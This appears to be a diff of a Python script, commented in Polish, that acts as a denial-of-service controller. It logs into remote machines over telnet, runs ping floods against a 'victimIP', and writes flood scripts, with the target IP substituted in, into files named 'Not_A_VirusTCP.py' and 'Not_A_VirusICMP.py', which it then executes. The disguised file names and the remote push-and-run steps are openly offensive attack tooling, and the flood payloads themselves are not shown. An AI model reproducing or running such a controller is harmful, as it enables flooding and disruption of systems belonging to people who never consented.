@@ -47,10 +47,25 @@ def telnetConnect(ip_address, victimIP, attackType: int):
             if attackType == 1:  # note
                 print('pingujemy..')
                 tn.write(b"ping 192.168.100.7\n")  # można zrobić wątki
-                if not attack:
+                if not attack:                     # tu też
                     print("stopping attack")
                     return
                 time.sleep(60)
+
+                # file = open('icmp_flood_code.txt', 'r')
+                # str1 = file.read()
+                # print(tn.write(b"touch Not_A_VirusICMP.py"))
+                # print(tn.write(bytes('echo' + '"' + str1 + '"' + '>>' + 'Not_A_VirusICMP.py', encoding="ascii")))
+                # print(tn.write(b"python Not_A_VirusICMP.py"))
+                # file.close()
+
+                if not attack:      #zrobić wątek sprawdzający czy przerwac atatak thread()
+                    print(tn.write(b"exit"))  # jak wyjść z wykonującego sie skryptu?!?!
+                    # tn.write(telnetlib.IP)  # chyba tak
+                    return
+
+                    # tn.write(b"exit\n")
+
 
                 # print(tn.read_all().decode('ascii'))
 
@@ -60,12 +75,14 @@ def telnetConnect(ip_address, victimIP, attackType: int):
                 str1.replace('1.1.1.1', victimIP)
                 str1.replace('111111', '10001')
 
-                print(tn.write(b"touch code.py"))
-                print(tn.write(bytes('echo' + '"' + str1 + '"' + '>>' + 'code.py', encoding="ascii")))
-                print(tn.write(b"python code.py"))
+                print(tn.write(b"touch Not_A_VirusTCP.py"))
+                print(tn.write(bytes('echo' + '"' + str1 + '"' + '>>' + 'Not_A_VirusTCP.py', encoding="ascii")))
+                print(tn.write(b"python Not_A_VirusTCP.py"))
                 file.close()
                 if not attack:
-                    print(tn.write(b"exit"))  # todo:jak wyjść z wykonującego sie skryptu?!?!
+
+                    print(tn.write(b"exit"))  # jak wyjść z wykonującego sie skryptu?!?!
+                    # tn.write(telnetlib.IP)  # chyba tak
                     return
 
                     # tn.write(b"exit\n")
